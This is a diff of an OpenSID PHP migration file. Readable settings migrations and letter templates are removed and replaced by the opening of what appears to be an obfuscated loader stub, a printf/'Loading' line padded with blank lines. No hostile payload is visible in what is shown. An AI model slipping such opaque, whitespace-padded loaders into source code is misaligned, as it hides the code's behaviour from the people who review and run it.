@@ -1,594 +1,673 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/migrations/Migrasi_fitur_premium_2212.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use App\Enums\HubunganRTMEnum;
-use App\Enums\StatusEnum;
-use App\Models\FormatSurat;
-use App\Models\RefJabatan;
-use App\Models\SettingAplikasi;
-use Illuminate\Support\Facades\DB;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Migrasi_fitur_premium_2212 extends MY_model
-{
-    public function up()
-    {
-        $hasil = true;
 
-        // Jalankan migrasi sebelumnya
-        $hasil = $hasil && $this->jalankan_migrasi('migrasi_fitur_premium_2211');
-        $hasil = $hasil && $this->migrasi_2022110171($hasil);
-        $hasil = $hasil && $this->migrasi_2022110771($hasil);
-        $hasil = $hasil && $this->migrasiPengaturanAplikasi($hasil);
-        $hasil = $hasil && $this->migrasi_2022110951($hasil);
 
-        // Modul DTKS
-        $hasil = $hasil && $this->jalankan_migrasi('migrasi_dtks');
-        $hasil = $hasil && $this->migrasi_2022111653($hasil);
-        $hasil = $hasil && $this->migrasi_2022111654($hasil);
-        $hasil = $hasil && $this->migrasi_2022111751($hasil);
-        $hasil = $hasil && $this->migrasi_2022112071($hasil);
-        $hasil = $hasil && $this->migrasi_2022112151($hasil);
-        $hasil = $hasil && $this->suratKeteranganKurangMampu($hasil);
-        $hasil = $hasil && $this->suratKeteranganBedaIdentitas($hasil);
-        $hasil = $hasil && $this->migrasi_2022112851($hasil);
-        $hasil = $hasil && $this->migrasi_2022112971($hasil);
-        $hasil = $hasil && $this->migrasi_2022113052($hasil);
 
-        return $hasil && true;
-    }
 
-    protected function migrasi_2022110171($hasil)
-    {
-        if (! $this->db->field_exists('premium', 'migrasi')) {
-            $fields = [
-                'premium' => [
-                    'type' => 'text',
-                    'null' => true,
-                ],
-            ];
-            $hasil = $hasil && $this->dbforge->add_column('migrasi', $fields);
-        }
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022110771($hasil)
-    {
-        // Buat ulang view keluarga_aktif
-        return $hasil && $this->db->query('CREATE OR REPLACE VIEW keluarga_aktif AS SELECT k.* FROM tweb_keluarga k LEFT JOIN tweb_penduduk p ON k.nik_kepala = p.id WHERE p.status_dasar = 1');
-    }
 
-    protected function migrasiPengaturanAplikasi($hasil)
-    {
-        // Pengaturan aplikasi jenis text
-        DB::table('setting_aplikasi')->whereNull('jenis')->orWhere('jenis', '=', '')->update(['jenis' => 'text']);
 
-        // Pengaturan aplikasi kategori sistem
-        DB::table('setting_aplikasi')->whereNull('kategori')->orWhere('kategori', '=', '')->update(['kategori' => 'sistem']);
 
-        // Tambah kolom judul
-        if (! $this->db->field_exists('judul', 'setting_aplikasi')) {
-            $fields = [
-                'judul' => [
-                    'type'       => 'VARCHAR',
-                    'constraint' => 100,
-                    'null'       => true,
-                    'after'      => 'id',
-                ],
-            ];
-            $hasil = $hasil && $this->dbforge->add_column('setting_aplikasi', $fields);
 
-            // Tambahkan data judul
-            $daftar_pengaturan = DB::table('setting_aplikasi')->whereNull('judul')->get();
-            if ($daftar_pengaturan) {
-                foreach ($daftar_pengaturan as $pengaturan) {
-                    if ($pengaturan->key === 'tahun_idm') {
-                        $judul = 'Tahun IDM';
-                    } elseif ($pengaturan->key === 'ip_adress_kehadiran') {
-                        $judul = 'IP Adress Kehadiran';
-                    } elseif ($pengaturan->key === 'aktifkan_sms') {
-                        $judul = 'Aktifkan SMS';
-                    } elseif ($pengaturan->key === 'kode_desa_bps') {
-                        $judul = 'Kode Desa BPS';
-                    } elseif ($pengaturan->key === 'sebutan_nip_desa') {
-                        $judul = 'Sebutan NIP Desa';
-                    } elseif ($pengaturan->key === 'statistik_chart_3d') {
-                        $judul = 'Statistik Chart 3D';
-                    } elseif ($pengaturan->key === 'covid_rss') {
-                        $judul = 'Covid RSS';
-                    } elseif ($pengaturan->key === 'pesan_singkat_wa') {
-                        $judul = 'Pesan Singkat WA';
-                    } elseif ($pengaturan->key === 'mac_adress_kehadiran') {
-                        $judul = 'MAC Adress Kehadiran';
-                    } elseif ($pengaturan->key === 'aktifkan_sms') {
-                        $judul = 'Aktifkan SMS';
-                    } else {
-                        $judul = ucwords(str_replace('_', ' ', $pengaturan->key));
-                    }
 
-                    if (preg_match('/tte/i', $judul)) {
-                        $judul = str_replace('Tte', 'TTE', $judul);
-                    }
 
-                    DB::table('setting_aplikasi')->where('id', $pengaturan->id)->update(['judul' => $judul]);
-                }
-            }
-        }
 
-        // Tambah kolom option
-        if (! $this->db->field_exists('option', 'setting_aplikasi')) {
-            $fields = [
-                'option' => [
-                    'type'  => 'TEXT',
-                    'null'  => true,
-                    'after' => 'jenis',
-                ],
-            ];
-            $hasil = $hasil && $this->dbforge->add_column('setting_aplikasi', $fields);
-        }
 
-        // Tambah kolom attribute
-        if (! $this->db->field_exists('attribute', 'setting_aplikasi')) {
-            $fields = [
-                'attribute' => [
-                    'type'  => 'TEXT',
-                    'null'  => true,
-                    'after' => 'option',
-                ],
-            ];
-            $hasil = $hasil && $this->dbforge->add_column('setting_aplikasi', $fields);
-        }
 
-        // offline_mode
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'offline_mode')
-            ->update([
-                'option' => json_encode([
-                    '0' => 'Web bisa diakses publik',
-                    '1' => 'Web hanya bisa diakses petugas web',
-                    '2' => 'Web non-aktif sama sekali',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'web',
-            ]);
 
-        // jenis_peta
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'jenis_peta')
-            ->update([
-                'option' => json_encode([
-                    '1' => 'OpenStreetMap',
-                    '2' => 'OpenStreetMap H.O.T',
-                    '3' => 'Mapbox Streets',
-                    '4' => 'Mapbox Satellite',
-                    '5' => 'Mapbox Satellite-Street',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'peta',
-            ]);
 
-        // penomoran_surat
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'penomoran_surat')
-            ->update([
-                'option' => json_encode([
-                    '1' => 'Nomor berurutan untuk masing-masing surat masuk dan keluar; dan untuk semua surat layanan',
-                    '2' => 'Nomor berurutan untuk masing-masing surat masuk dan keluar; dan untuk setiap surat layanan dengan jenis yang sama',
-                    '3' => 'Nomor berurutan untuk keseluruhan surat layanan, masuk dan keluar',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'sistem',
-            ]);
 
-        // timezone
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'timezone')
-            ->update([
-                'option' => json_encode([
-                    'Asia/Jakarta'  => 'Asia/Jakarta',
-                    'Asia/Makassar' => 'Asia/Makassar',
-                    'Asia/Jayapura' => 'Asia/Jayapura',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'sistem',
-            ]);
 
-        // sumber_gambar_slider
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'sumber_gambar_slider')
-            ->update([
-                'option' => json_encode([
-                    '1' => 'Gambar utama artikel terbaru',
-                    '2' => 'Gambar utama artikel terbaru yang masuk ke slider atas',
-                    '3' => 'Gambar dalam album galeri yang dimasukkan ke slider',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'web',
-            ]);
 
-        // tampilan_anjungan
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'tampilan_anjungan')
-            ->update([
-                'option' => json_encode([
-                    '0' => 'Tidak Aktif',
-                    '1' => 'Slider',
-                    '2' => 'Video',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'anjungan',
-            ]);
 
-        // warna_tema_admin
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'warna_tema_admin')
-            ->update([
-                'option' => json_encode([
-                    'skin-blue'         => 'Biru',
-                    'skin-blue-light'   => 'Biru Terang',
-                    'skin-black'        => 'Hitam',
-                    'skin-black-light'  => 'Hitam Terang',
-                    'skin-red'          => 'Merah',
-                    'skin-red-light'    => 'Merah Terang',
-                    'skin-yellow'       => 'Kuning',
-                    'skin-yellow-light' => 'Kuning Terang',
-                    'skin-purple'       => 'Ungu',
-                    'skin-purple-light' => 'Ungu Terang',
-                    'skin-green'        => 'Hijau',
-                    'skin-green-light'  => 'Hijau Terang',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'sistem',
-            ]);
 
-        // tampilan_anjungan_slider
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'tampilan_anjungan_slider')
-            ->update([
-                'jenis'    => 'option',
-                'option'   => null,
-                'kategori' => 'anjungan',
-            ]);
 
-        // web_theme
-        DB::table('setting_aplikasi')
-            ->where('key', '=', 'web_theme')
-            ->update([
-                'jenis'    => 'option',
-                'option'   => null,
-                'kategori' => 'web',
-            ]);
 
-        // Sesuaikan kategori
-        DB::table('setting_aplikasi')
-            ->whereIn('key', [
-                'tte',
-                'tte_api',
-                'tte_username',
-                'tte_password',
-                'visual_tte',
-                'visual_tte_gambar',
-                'visual_tte_weight',
-                'visual_tte_height',
-            ])
-            ->update([
-                'kategori' => 'tte',
-            ]);
 
-        DB::table('setting_aplikasi')
-            ->where('key', 'penggunaan_server')
-            ->update([
-                'kategori' => 'hidden',
-            ]);
 
-        // Tambahkan validasi untuk pengaturan berikut
-        DB::table('setting_aplikasi')
-            ->where('key', 'banyak_foto_tiap_produk')
-            ->update([
-                'attribute' => 'class="" max="5"',
-            ]);
 
-        DB::table('setting_aplikasi')
-            ->where('key', 'current_version')
-            ->update([
-                'attribute' => 'class="" disabled',
-                'kategori'  => 'sistem',
-            ]);
 
-        // Ganti jenis = int menjadi jenis = text dengan atribut class="int"
-        DB::table('setting_aplikasi')
-            ->where('jenis', 'int')
-            ->update([
-                'jenis'     => 'text',
-                'attribute' => 'class="int"',
-            ]);
 
-        // Sesuaikan attribute untuk modul kehadiran
-        DB::table('setting_aplikasi')
-            ->where('key', 'mac_adress_kehadiran')
-            ->update([
-                'attribute' => 'class="mac_address" placeholder="00:1B:44:11:3A:B7"',
-            ]);
 
-        DB::table('setting_aplikasi')
-            ->where('key', 'ip_adress_kehadiran')
-            ->update([
-                'attribute' => 'class="ip_address" placeholder="127.0.0.1"',
-            ]);
 
-        DB::table('setting_aplikasi')
-            ->where('key', 'id_pengunjung_kehadiran')
-            ->update([
-                'attribute' => 'class="alfanumerik" placeholder="ad02c373c2a8745d108aff863712fe92"',
-            ]);
 
-        DB::table('setting_aplikasi')
-            ->where('key', 'id_pengunjung_kehadiran')
-            ->update([
-                'attribute' => 'class="alfanumerik" placeholder="ad02c373c2a8745d108aff863712fe92"',
-            ]);
 
-        // Ganti semua jenis option-kode dan option-value menjadi option
-        DB::table('setting_aplikasi')
-            ->whereIn('jenis', [
-                'option-kode',
-                'option-value',
-            ])
-            ->update([
-                'jenis' => 'option',
-            ]);
 
-        if ($this->db->table_exists('setting_aplikasi_options')) {
-            // Hapus tabel setting aplikasi options
-            $hasil = $hasil && $this->dbforge->drop_table('setting_aplikasi_options');
-        }
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022110951($hasil)
-    {
-        if (! $this->db->field_exists('satuan_waktu', 'pembangunan')) {
-            $hasil = $hasil && $this->dbforge->add_column('pembangunan', [
-                'satuan_waktu' => [
-                    'type'       => 'TINYINT',
-                    'constraint' => 1,
-                    'null'       => false,
-                    'default'    => '3',
-                    'after'      => 'waktu',
-                    'comment'    => '1 = Hari, 2 = Minggu, 3 = Bulan, 4 = Tahun',
-                ],
-            ]);
-        }
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022111653($hasil)
-    {
-        if (! $this->db->field_exists('ip_address', 'pengaduan')) {
-            $hasil = $hasil && $this->dbforge->add_column('pengaduan', [
-                'ip_address' => [
-                    'type'       => 'VARCHAR',
-                    'constraint' => 100,
-                    'null'       => false,
-                    'after'      => 'foto',
-                ],
-            ]);
-        }
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022111654($hasil)
-    {
-        // Perbarui urutan pamong kades
-        DB::table('tweb_desa_pamong')
-            ->where('jabatan_id', RefJabatan::KADES)
-            ->orWhere('jabatan_id', kades()->id)
-            ->update([
-                'urut' => 1,
-            ]);
 
-        // Perbarui urutan pamong sekdes
-        DB::table('tweb_desa_pamong')
-            ->where('jabatan_id', RefJabatan::SEKDES)
-            ->orWhere('jabatan_id', sekdes()->id)
-            ->update([
-                'urut' => 2,
-            ]);
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022111751($hasil)
-    {
-        // Pindahkan pengaturan Font dari menggunakan Enum ke pengaturan option
-        DB::table('setting_aplikasi')
-            ->where('key', 'font_surat')
-            ->whereNull('option')
-            ->update([
-                'option' => json_encode([
-                    'Andale Mono',
-                    'Arial',
-                    'Arial Black',
-                    'Bookman Old Style',
-                    'Comic Sans MS',
-                    'Courier New',
-                    'Georgia',
-                    'Helvetica',
-                    'Impact',
-                    'Tahoma',
-                    'Times New Roman',
-                    'Trebuchet MS',
-                    'Verdana',
-                ]),
-                'jenis'    => 'option',
-                'kategori' => 'format_surat',
-            ]);
 
-        return $hasil;
-    }
 
-    protected function migrasi_2022112071($hasil)
-    {
-        $hasil = $hasil && $this->tambah_setting([
-            'judul'      => 'Sebutan Pemerintah Desa',
-            'key'        => 'sebutan_pemerintah_desa',
-            'value'      => 'Pemerintah ' . ucwords(SettingAplikasi::where('key', 'sebutan_desa')->first()->value),
-            'keterangan' => 'Sebutan Pemerintah Desa',
-            'kategori'   => 'Pemerintah Desa',
-        ]);
 
-        return $hasil && $this->ubah_modul(18, [
-            'modul' => '[Pemerintah Desa]',
-        ]);
-    }
 
-    protected function migrasi_2022112151($hasil)
-    {
-        // Perbaiki data penduduk untuk data kepala rtm berdasarkan data tweb_rtm
-        $daftar_rtm = DB::table('tweb_rtm')->get(['nik_kepala', 'no_kk']);
 
-        if ($daftar_rtm) {
-            foreach ($daftar_rtm as $key => $value) {
-                DB::table('tweb_penduduk')
-                    ->where('id', '=', $value->nik_kepala)
-                    ->update([
-                        'id_rtm'    => $value->no_kk,
-                        'rtm_level' => HubunganRTMEnum::KEPALA_RUMAH_TANGGA,
-                    ]);
-            }
-        }
 
-        return $hasil;
-    }
 
-    protected function suratKeteranganKurangMampu($hasil)
-    {
-        return $hasil && $this->tambah_surat_tinymce([
-            'nama'                => 'Keterangan Kurang Mampu',
-            'kode_surat'          => 'S-11',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::YA,
-            'kode_isian'          => '[{"tipe":"textarea","kode":"[form_keperluan]","nama":"Keperluan","deskripsi":"Masukkan Keperluan","atribut":"required"}]',
-            'form_isian'          => '{"individu":{"sex":"","status_dasar":"1","kk_level":"1"}}',
-            'mandiri'             => StatusEnum::YA,
-            'syarat_surat'        => ['2', '3', '1'],
-            'template'            => "
-                <h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>\r\n<p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan dengan sebenarnya bahwa :</p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 172px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90429%; height: 18px; text-align: left;\">1.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 18px;\">Nama Lengkap</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\"><strong>[NAma]</strong></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90429%; text-align: left; height: 18px;\">2.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 18px;\">ID BDT</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[Id_bdT]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90429%; height: 18px; text-align: left;\">3.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 18px;\">No. KTP</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Nik]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90429%; height: 18px; text-align: left;\">4.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 18px;\">Tempat / Tanggal Lahir</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Ttl]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90429%; height: 18px; text-align: left;\">5.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 18px;\">Jenis Kelamin</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; height: 18px; text-align: justify;\">[Jenis_kelamin]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90429%; text-align: left; height: 18px;\">6.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 18px;\">Kewarganegaraan</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[WArga_negara]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 18px;\"> </td>\r\n<td style=\"width: 3.90429%; text-align: left; height: 18px;\">7.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 18px;\">Agama</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 18px;\">[AgAma]</td>\r\n</tr>\r\n<tr style=\"height: 10px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 10px;\"> </td>\r\n<td style=\"width: 3.90429%; text-align: left; height: 10px;\">8.</td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 10px;\">Pekerjaan</td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 10px;\">:</td>\r\n<td style=\"width: 60.0206%; text-align: justify; height: 10px;\">[PeKerjaan]</td>\r\n</tr>\r\n<tr style=\"height: 36px;\">\r\n<td style=\"width: 4.31655%; text-align: center; height: 36px;\"> </td>\r\n<td style=\"width: 3.90429%; height: 36px; text-align: left;\">7.<br /><br /></td>\r\n<td style=\"width: 30.5253%; text-align: left; height: 36px;\">Alamat / Tempat Tinggal<br /><br /></td>\r\n<td style=\"width: 1.2333%; text-align: center; height: 36px;\">:<br /><br /></td>\r\n<td style=\"width: 60.0206%; height: 36px; text-align: justify;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Bahwa yang tersebut namanya di atas, sepanjang pengetahuan dan penelitian kami hingga saat dikeluarkannya surat keterangan ini memang benar Keluarga yang KURANG MAMPU dan tidak memiliki pengahasilan tetap.<br /><br /></p>\r\n<p style=\"text-indent: 30px; text-align: center;\"><span style=\"text-decoration: underline;\"><strong>DAFTAR TANGGUNGAN KELUARGA<br /></strong></span></p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 138px;\" border=\"1\">\r\n<tbody>\r\n<tr style=\"height: 12px;\">\r\n<td style=\"width: 6.37205%; text-align: center; height: 12px;\"><span style=\"font-size: 10pt;\"><strong>NO.</strong></span></td>\r\n<td style=\"width: 20.8633%; text-align: center; height: 12px;\"><span style=\"font-size: 10pt;\"><strong>NIK</strong></span></td>\r\n<td style=\"width: 19.63%; text-align: center; height: 12px;\"><span style=\"font-size: 10pt;\"><strong>NAMA</strong></span></td>\r\n<td style=\"width: 13.4639%; text-align: center; height: 12px;\"><span style=\"font-size: 10pt;\"><strong>L / P</strong></span></td>\r\n<td style=\"width: 24.7683%; text-align: center; height: 12px;\"><span style=\"font-size: 10pt;\"><strong>TEMPAT TANGGAL LAHIR</strong></span></td>\r\n<td style=\"width: 14.7996%; text-align: center; height: 12px;\"><span style=\"font-size: 10pt;\"><strong>SHDK</strong></span></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 6.37205%; height: 18px; text-align: center;\"><span style=\"font-size: 10pt;\">[KLg1_no]</span></td>\r\n<td style=\"width: 20.8633%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg1_nik]</span></td>\r\n<td style=\"width: 19.63%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg1_nama]</span></td>\r\n<td style=\"width: 13.4639%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg1_jenis_kelamin]</span></td>\r\n<td style=\"width: 24.7683%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg1_ttl]</span></td>\r\n<td style=\"width: 14.7996%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg1_hubungan_kk]</span></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 6.37205%; height: 18px; text-align: center;\"><span style=\"font-size: 10pt;\">[KLg2_no]</span></td>\r\n<td style=\"width: 20.8633%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg2_nik]</span></td>\r\n<td style=\"width: 19.63%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg2_nama]</span></td>\r\n<td style=\"width: 13.4639%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg2_jenis_kelamin]</span></td>\r\n<td style=\"width: 24.7683%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg2_ttl]</span></td>\r\n<td style=\"width: 14.7996%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg2_hubungan_kk]</span></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 6.37205%; height: 18px; text-align: center;\"><span style=\"font-size: 10pt;\">[KLg3_no]</span></td>\r\n<td style=\"width: 20.8633%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg3_nik]</span></td>\r\n<td style=\"width: 19.63%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg3_nama]</span></td>\r\n<td style=\"width: 13.4639%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg3_jenis_kelamin]</span></td>\r\n<td style=\"width: 24.7683%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg3_ttl]</span></td>\r\n<td style=\"width: 14.7996%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg3_hubungan_kk]</span></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 6.37205%; height: 18px; text-align: center;\"><span style=\"font-size: 10pt;\">[KLg4_no]</span></td>\r\n<td style=\"width: 20.8633%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg4_nik]</span></td>\r\n<td style=\"width: 19.63%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg4_nama]</span></td>\r\n<td style=\"width: 13.4639%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg4_jenis_kelamin]</span></td>\r\n<td style=\"width: 24.7683%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg4_ttl]</span></td>\r\n<td style=\"width: 14.7996%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg4_hubungan_kk]</span></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 6.37205%; height: 18px; text-align: center;\"><span style=\"font-size: 10pt;\">[KLg5_no]</span></td>\r\n<td style=\"width: 20.8633%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg5_nik]</span></td>\r\n<td style=\"width: 19.63%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg5_nama]</span></td>\r\n<td style=\"width: 13.4639%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg5_jenis_kelamin]</span></td>\r\n<td style=\"width: 24.7683%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg5_ttl]</span></td>\r\n<td style=\"width: 14.7996%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg5_hubungan_kk]</span></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 6.37205%; height: 18px; text-align: center;\"><span style=\"font-size: 10pt;\">[KLg6_no]</span></td>\r\n<td style=\"width: 20.8633%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg6_nik]</span></td>\r\n<td style=\"width: 19.63%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg6_nama]</span></td>\r\n<td style=\"width: 13.4639%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg6_jenis_kelamin]</span></td>\r\n<td style=\"width: 24.7683%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg6_ttl]</span></td>\r\n<td style=\"width: 14.7996%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg6_hubungan_kk]</span></td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 6.37205%; height: 18px; text-align: center;\"><span style=\"font-size: 10pt;\">[KLg7_no]</span></td>\r\n<td style=\"width: 20.8633%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg7_nik]</span></td>\r\n<td style=\"width: 19.63%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg7_nama]</span></td>\r\n<td style=\"width: 13.4639%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg7_jenis_kelamin]</span></td>\r\n<td style=\"width: 24.7683%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg7_ttl]</span></td>\r\n<td style=\"width: 14.7996%; height: 18px;\"><span style=\"font-size: 10pt;\">[KLg7_hubungan_kk]</span></td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-indent: 30px;\">Surat Keterangan ini dibuat untuk keperluan : <span style=\"text-decoration: underline;\"><strong>[Form_keperluaN]</strong></span></p>\r\n<p style=\"text-indent: 30px;\">Demikian surat keterangan ini dibuat dengan sebenarnya,  untuk dapat dipergunakan sebagaimana mestinya.</p>\r\n<p> </p>\r\n<table style=\"border-collapse: collapse; width: 100%;\" border=\"0\">\r\n<tbody>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\"> </td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; text-align: center;\">[NaMa_desa], [TgL_surat]</td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\">Pemegang Surat</td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; text-align: center;\">[Atas_nama]</td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\"> </td>\r\n<td style=\"width: 30%;\"><br /><br /><br /><br /></td>\r\n<td style=\"width: 35%;\"> </td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%; text-align: center;\">[NAma]</td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; text-align: center;\">[Nama_pamonG]</td>\r\n</tr>\r\n<tr>\r\n<td style=\"width: 35%;\"> </td>\r\n<td style=\"width: 30%;\"> </td>\r\n<td style=\"width: 35%; 